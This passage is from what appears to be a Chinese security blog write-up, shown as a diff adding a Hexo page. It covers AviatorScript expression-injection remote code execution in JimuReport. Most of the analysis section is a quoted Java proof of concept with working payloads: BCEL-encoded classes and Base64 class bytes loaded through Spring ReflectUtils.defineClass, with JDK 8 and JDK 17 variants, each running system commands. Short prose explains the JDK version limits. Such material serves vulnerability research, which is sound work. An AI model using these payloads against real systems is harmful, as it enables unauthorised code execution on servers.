+<p>造成RCE</p>
+<p>将两者结合便是该漏洞的实现原理</p>
+<p>AviatorScript表达式注入的payload如下（参考：<a target="_blank" rel="noopener" href="https://github.com/Whoopsunix/JavaRce/blob/main/SecVulns/VulnCore/Expression/AviatorAttack/src/main/java/com/ppp/aviator/AviatorDemo.java%EF%BC%89">https://github.com/Whoopsunix/JavaRce/blob/main/SecVulns/VulnCore/Expression/AviatorAttack/src/main/java/com/ppp/aviator/AviatorDemo.java）</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">package com.ppp.aviator;</span><br><span class="line"></span><br><span class="line">import com.googlecode.aviator.AviatorEvaluator;</span><br><span class="line">import com.googlecode.aviator.AviatorEvaluatorInstance;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author guchangan1 Whoopsunix</span><br><span class="line"> */</span><br><span class="line">public class AviatorDemo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * normal</span><br><span class="line">         */</span><br><span class="line">//        AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();</span><br><span class="line">//        evaluator.setFunctionMissing(JavaMethodReflectionFunctionMissing.getInstance());</span><br><span class="line">//        evaluator.execute(&quot;exec(Runtime.getRuntime(), &#x27;open -a Calculator.app&#x27;)&quot;);</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * AviatorEvaluatorInstance   bcel</span><br><span class="line">         *</span><br><span class="line">         * String bcel = &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A&quot;;</span><br><span class="line">         *         Object o = Class.forName(bcel, true, new ClassLoader()).newInstance();</span><br><span class="line">         *         o.getClass().getMethod(&quot;exec&quot;, String.class).invoke(o, &quot;open -a Calculator.app&quot;);</span><br><span class="line">         */</span><br><span class="line">//        AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();</span><br><span class="line">//        evaluator.execute(&quot;&#x27;a&#x27;+(c=Class.forName(\&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A\&quot;,true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\&quot;open -a Calculator.app\&quot;) );&quot;);</span><br><span class="line"></span><br><span class="line">        // 分开定义</span><br><span class="line">//        evaluator.execute(&quot;(c = Class.forName(&#x27;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A&#x27;,true,new com.sun.org.apache.bcel.internal.util.ClassLoader())) + \n&quot; +</span><br><span class="line">//                &quot;(c.exec(&#x27;whoami&#x27;))&quot;);</span><br><span class="line"></span><br><span class="line">        // test</span><br><span class="line">//        AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();</span><br><span class="line">//        String payload = &quot;(c=(Class.forName(&#x27;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A&#x27;,true,new com.sun.org.apache.bcel.internal.util.ClassLoader())))+(c.exec(&#x27;open -a Calculator.app&#x27;))&quot;;</span><br><span class="line">//        payload = &quot;&#x27;b&#x27;+(a=new com.sun.org.apache.bcel.internal.util.ClassLoader())+(c=(Class.forName(&#x27;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A&#x27;,true,a)))+(c.exec(&#x27;open -a Calculator.app&#x27;))&quot;;</span><br><span class="line">//        payload = &quot;new java.lang.String()&quot;;</span><br><span class="line">//        Expression compile = evaluator.compile(payload, true);</span><br><span class="line">//        compile.execute(new HashMap(5));</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * Spring ReflectUtils</span><br><span class="line">         */</span><br><span class="line">        AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();</span><br><span class="line">        // JDK 8</span><br><span class="line">        evaluator.execute(&quot;use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass(&#x27;org.example.Exec&#x27;, Base64Utils.decodeFromString(&#x27;yv66vgAAADQAMgoACwAZCQAaABsIABwKAB0AHgoAHwAgCAAhCgAfACIHACMIACQHACUHACYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxvcmcvZXhhbXBsZS9FeGVjOwEADVN0YWNrTWFwVGFibGUHACUHACMBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAlFeGVjLmphdmEMAAwADQcAJwwAKAApAQAERXhlYwcAKgwAKwAsBwAtDAAuAC8BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAwADEBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQALc3RhdGljIEV4ZWMBABBvcmcvZXhhbXBsZS9FeGVjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAKAAsAAAAAAAIAAQAMAA0AAQAOAAAAdgACAAIAAAAaKrcAAbIAAhIDtgAEuAAFEga2AAdXpwAETLEAAQAEABUAGAAIAAMADwAAABoABgAAAAcABAAJAAwACgAVAAwAGAALABkADQAQAAAADAABAAAAGgARABIAAAATAAAAEAAC/wAYAAEHABQAAQcAFQAACAAWAA0AAQAOAAAAWwACAAEAAAAWsgACEgm2AAS4AAUSBrYAB1enAARLsQABAAAAEQAUAAgAAwAPAAAAFgAFAAAAEQAIABIAEQAUABQAEwAVABUAEAAAAAIAAAATAAAABwACVAcAFQAAAQAXAAAAAgAY&#x27;), ClassLoader.getSystemClassLoader());&quot;);</span><br><span class="line">        // JDK 17</span><br><span class="line">//        evaluator.execute(&quot;use org.springframework.cglib.core.*;use org.springframework.util.*;use java.security.*;ReflectUtils.defineClass(&#x27;org.springframework.expression.Test&#x27;, Base64Utils.decodeFromString(&#x27;yv66vgAAADQALwoACgAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdDsBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACEBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAALAAwHACQMACUAJgEAC3N0YXRpYyBFeGVjBwAnDAAoACkHACoMACsALAEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMAC0ALgEAE2phdmEvbGFuZy9FeGNlcHRpb24BACNvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACQAKAAAAAAACAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAABgAPAAAADAABAAAABQAQABEAAAAIABIADAABAA0AAABbAAIAAQAAABayAAISA7YABLgABRIGtgAHV6cABEuxAAEAAAARABQACAADAA4AAAAWAAUAAAAJAAgACgARAAwAFAALABUADQAPAAAAAgAAABMAAAAHAAJUBwAUAAABABUAAAACABY=&#x27;), ClassLoader.getSystemClassLoader(), nil, Class.forName(&#x27;org.springframework.expression.ExpressionParser&#x27;));&quot;);</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * AviatorEvaluatorInstance   onFunctionMissing</span><br><span class="line">         */</span><br><span class="line">//        AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();</span><br><span class="line">//        evaluator.setFunctionMissing(JavaMethodReflectionFunctionMissing.getInstance());</span><br><span class="line">//        evaluator.execute(&quot;exec(Runtime.getRuntime(), &#x27;open -a Calculator.app&#x27;)&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * ScriptEngineManager  aviator</span><br><span class="line">         */</span><br><span class="line">//        ScriptEngineManager m = new ScriptEngineManager();</span><br><span class="line">//        ScriptEngine engine = m.getEngineByName(&quot;aviator&quot;);</span><br><span class="line">//        engine.eval(&quot;&#x27;a&#x27;+(c=Class.forName(\&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A\&quot;,true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\&quot;open /System/Applications/Calculator.app\&quot;) );&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>另外，我使用jdk8才能成功复现，jdk17利用请见：<a target="_blank" rel="noopener" href="https://whoopsunix.com/docs/java/Expression/Aviator/#jdk-%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84-aviator-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%EF%BC%8CBCEL">https://whoopsunix.com/docs/java/Expression/Aviator/#jdk-%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84-aviator-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5，BCEL</a> <code>Classloader</code>在 JDK &lt; 8u251之前是在rt.jar里面，所以要求<code>JDK &lt; 8u251</code>。</p>
+<p>原理总结一下，大致是：在 JDK 9 之后的版本引入了 named module 机制，将 <code>java.*</code> 下非public变量和方法声明为受保护的，因此不能直接访问。这个限制在 JDK 17 强制开启。也就是说我们无法直接调用<code>java.lang.ClassLoader.defineClass()</code> 方法，但是我们可以通过该方法中的lookupDefineClassMethod.invoke来创建class</p>
+<p><img src="https://whoopsunix.com/assets/images/image-20240502111908506-74d459b0292af6e4b3216e841360b42f.png" alt="image-20240502111908506"></p>
+<p>实际上只要满足 <code>contextClass != null &amp;&amp; contextClass.getClassLoader() == loader</code> 这个条件，<code>contextClass</code> 也是可控的，contextClass选择一个 ClassLoader 中有的就行，既然是解析表达式，就随便选一个类 org.springframework.expression.ExpressionParser。</p>
+<p>并且，积木报表低版本（&lt;&#x3D;1.6.0）无法使用该payload，具体原因是因为在低版本中，TRACE_EVAL属性被赋值为true，而高版本为false，该属性会影响Aviator中execute0方法的调用。</p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2024/07/22/JumpServer-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-40629%EF%BC%89-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-40628%EF%BC%89/"> JumpServer 任意文件写入漏洞（CVE-2024-40629）&amp; 任意文件读取漏洞（CVE-2024-40628）</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2024/09/10/Apache-OfBiz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-9496%EF%BC%89/">Apache OfBiz 反序列化命令执行漏洞&amp;分析（CVE-2020-9496） </a></p>
+<p>© 2024 ycxlo</p>
+<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/07/22/JumpServer-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-40629%EF%BC%89-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-40628%EF%BC%89/" rel="prev" title="JumpServer 任意文件写入漏洞（CVE-2024-40629）& 任意文件读取漏洞（CVE-2024-40628）">
+      <i class="fa fa-chevron-left"></i> JumpServer 任意文件写入漏洞（CVE-2024-40629）& 任意文件读取漏洞（CVE-2024-40628）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/09/10/Apache%20OfBiz%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-49070%EF%BC%89/" rel="next" title="Apache OfBiz 反序列化命令执行漏洞（CVE-2023-49070）">
+      Apache OfBiz 反序列化命令执行漏洞（CVE-2023-49070） <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="nav-number">3.0.1.</span> <span class="nav-text">权限绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AviatorScript-RCE"><span class="nav-number">3.0.2.</span> <span class="nav-text">AviatorScript RCE</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
